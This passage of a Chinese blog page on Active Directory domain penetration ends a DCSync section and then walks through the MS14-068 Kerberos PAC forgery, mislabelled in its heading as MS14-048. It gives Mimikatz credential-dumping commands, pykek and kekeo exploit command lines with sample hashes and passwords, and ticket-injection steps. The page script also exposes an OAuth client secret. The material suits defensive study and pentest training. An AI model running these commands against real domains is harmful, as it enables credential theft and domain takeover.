并去连接。如果不提供该参数,Mimikatz 会默认设置为当前域。</span><br><span class="line">        /dc可选的指定你想要使用 DCSync 连接并收集数据的域控制器。</span><br><span class="line">        另外还有一个/guid参数。</span><br><span class="line">        DCSync 命令行示例:</span><br><span class="line">        拉取 demo.local域中的 krbtgt / testwin7 / administrator 用户帐户的密码数据:</span><br><span class="line">        Mimikatz <span class="string">"privilege::debug"</span> <span class="string">"lsadump::dcsync /domain:demo.local /user:testwin7"</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="MS14-048-限制条件-打了补丁或者域中有Win2012-2012R2-域控"><a href="#MS14-048-限制条件-打了补丁或者域中有Win2012-2012R2-域控" class="headerlink" title="MS14-048 (限制条件:打了补丁或者域中有Win2012/2012R2 域控)"></a>MS14-048 (限制条件:打了补丁或者域中有Win2012/2012R2 域控)</h2><p>允许域内任何一个普通用户，将自己提升至域管权限。</p>
+<p>作为普通用户向域控请求一个没有PAC的Kerberos TGT认证的票据，域控会返回一个TGT(不包含PAC，PAC通常包含有用户组中的成员关系)</p>
+<p>生成一个伪造的PAC，因为没有密钥，所以生成的PAC”被标记”有MD5算法，而不是带有域用户密码数据的HMAC_MD5类型。</p>
+<p>把伪造的PAC结合上TGT构造认证数据，作为TGS服务的一部分发送到域控。</p>
+<p>域控会混淆构造的数据，所以直接丢弃之前用户发送没带有PAC的TGT，然后新构造一个TGT并用自己的认证数据插入到伪造的PAC当中，再把新TGT发送给用户</p>
+<p>这样带有伪造PAC的TGT就能使用户成为有漏洞域控上的域管理员。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. mimikatz从域控上面抓取到所有账户信息</span><br><span class="line">    mimikatz <span class="comment"># log</span></span><br><span class="line">    Using <span class="string">'mimikatz.log'</span> <span class="keyword">for</span> logfile : OK</span><br><span class="line">    mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">    Privilege <span class="string">'20'</span> OK</span><br><span class="line">    mimikatz <span class="comment"># lsadump::lsa /inject</span></span><br><span class="line">    ......</span><br><span class="line">2. https://github.com/bidord/pykek</span><br><span class="line">    C:\pykek-master&gt;python ms14-068.py -u testwin7@demo.local -s S-1-5-21-1239069908-882060383-2558203358-1130 -d owa2010dc.demo.local  -p 1qaz<span class="variable">$RFV</span> --rc4 6df9f68e4b0656fa9ffd91d250506f8f</span><br><span class="line">    [+] Creating ccache file <span class="string">'TGT_testwin7@demo.local.ccache'</span>... Done!]</span><br><span class="line">3. mimikatz <span class="comment"># kerberos::ptc TGT_testwin7@demo.local.ccache (利用mimikatz注入高权限TGT的缓存证书)</span></span><br></pre></td></tr></table></figure>
+
+<p>列举缓存证书的命令klist</p>
+<p>或者使用 kekeo<br>kerberos::purge or klist purge(为了让我们自己生成的票据生效，需要我们先用mimikatz将内存中的票据清空)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe <span class="comment"># exploit::ms14068 /domain:demo.local /user:testwin7 /password:1qaz$RFV /sid:S-1-5-21-1239069908-882060383-2558203358 /rid:1130 /kdc:owa2010dc.demo.local /ptt (接着使用域、普通域用户名和密码生成票据)</span></span><br><span class="line">http://www.mottoin.com/95877.html</span><br></pre></td></tr></table></figure>
+
+<p><strong>参考</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Attack Methods for Gaining Domain Admin Rights in Active Directory</span><br><span class="line">    http://adsecurity.org/?p=2362 (国内关于域的文章基本来自于这里 還有 http://www.harmj0y.net)</span><br><span class="line">一种深度隐蔽的后门方式(二)</span><br><span class="line">    https://www.anquanke.com/post/id/93542</span><br><span class="line">Mimikatz小实验:黄金票据+dcsync</span><br><span class="line">    http://www.freebuf.com/sectool/112594.html</span><br><span class="line">域渗透之hash与票据</span><br><span class="line">    http://mp.weixin.qq.com/s/ENStRpYspx5W974BKPzZtA</span><br><span class="line">域渗透——利用SYSVOL还原组策略中保存的密码</span><br><span class="line">    https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/</span><br><span class="line">如何巧妙的从ntds.dit中提取Hash和域信息</span><br><span class="line">    http://www.freebuf.com/articles/system/151463.html</span><br><span class="line">从活动目录中获取域管理员权限的6种方法</span><br><span class="line">    http://www.4hou.com/technology/4256.html</span><br><span class="line">Kerberoasting - Part 3</span><br><span class="line">    https://room362.com/post/2016/kerberoast-pt3/</span><br><span class="line">kekeo ticket 注入</span><br><span class="line">    https://www.anquanke.com/post/id/92484</span><br><span class="line">kerberoasting-without-mimikatz</span><br><span class="line">    https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</span><br><span class="line">    https://zhuanlan.zhihu.com/p/25723674 (翻譯)</span><br><span class="line">Hash传递攻击登陆Windows2012远程桌面</span><br><span class="line">    http://www.freebuf.com/articles/system/15757.html</span><br><span class="line">Mimikatz 非官方指南和命令参考_Part1</span><br><span class="line">    http://www.anquan.us/static/drops/tools-12462.html</span><br><span class="line">Mimikatz 非官方指南和命令参考_Part2</span><br><span class="line">    http://www.anquan.us/static/drops/pentesting-12521.html</span><br><span class="line">Mimikatz 非官方指南和命令参考_Part3</span><br><span class="line">    http://www.anquan.us/static/drops/tools-12754.html</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>转自：<a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/" target="_blank" rel="noopener">https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2018/12/25/2018-12-25-域渗透之票据/" title="域渗透之票据">https://wh0ale.github.io/2018/12/25/2018-12-25-域渗透之票据/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/域渗透/" rel="tag"><i class="fa fa-tag"></i># 域渗透</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2018/12/24/2018-12-24-甲方安全（二）/" rel="next" title="甲方安全（二）工具篇">
+                <i class="fa fa-chevron-left"></i> 甲方安全（二）工具篇
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2018/12/26/2018-12-26-CORS漏洞/" rel="prev" title="cors漏洞">
+                cors漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-the-Hash-PTH-hash传递攻击-即-Mimikatz-hash注入"><span class="nav-number">1.</span> <span class="nav-text">Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-The-Key-OverPass-the-Hash"><span class="nav-number">2.</span> <span class="nav-text">Pass The Key (OverPass-the-Hash)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-the-Ticket-票据传递攻击PtT"><span class="nav-number">3.</span> <span class="nav-text">Pass the Ticket (票据传递攻击PtT)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Golden-Ticket-黄金票据"><span class="nav-number">4.</span> <span class="nav-text">Golden Ticket (黄金票据)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Silver-Ticket-白银票据"><span class="nav-number">5.</span> <span class="nav-text">Silver Ticket (白银票据)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破"><span class="nav-number">6.</span> <span class="nav-text">Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberoasting-Kerberoast攻击的另一种姿势"><span class="nav-number">7.</span> <span class="nav-text">Kerberoasting - Kerberoast攻击的另一种姿势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SYSVOL"><span class="nav-number">8.</span> <span class="nav-text">SYSVOL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ntds-dit-活动目录的数据库文件"><span class="nav-number">9.</span> <span class="nav-text">ntds.dit (活动目录的数据库文件)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MS14-048-限制条件-打了补丁或者域中有Win2012-2012R2-域控"><span class="nav-number">10.</span> <span class="nav-text">MS14-048 (限制条件:打了补丁或者域中有Win2012/2012R2 域控)</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
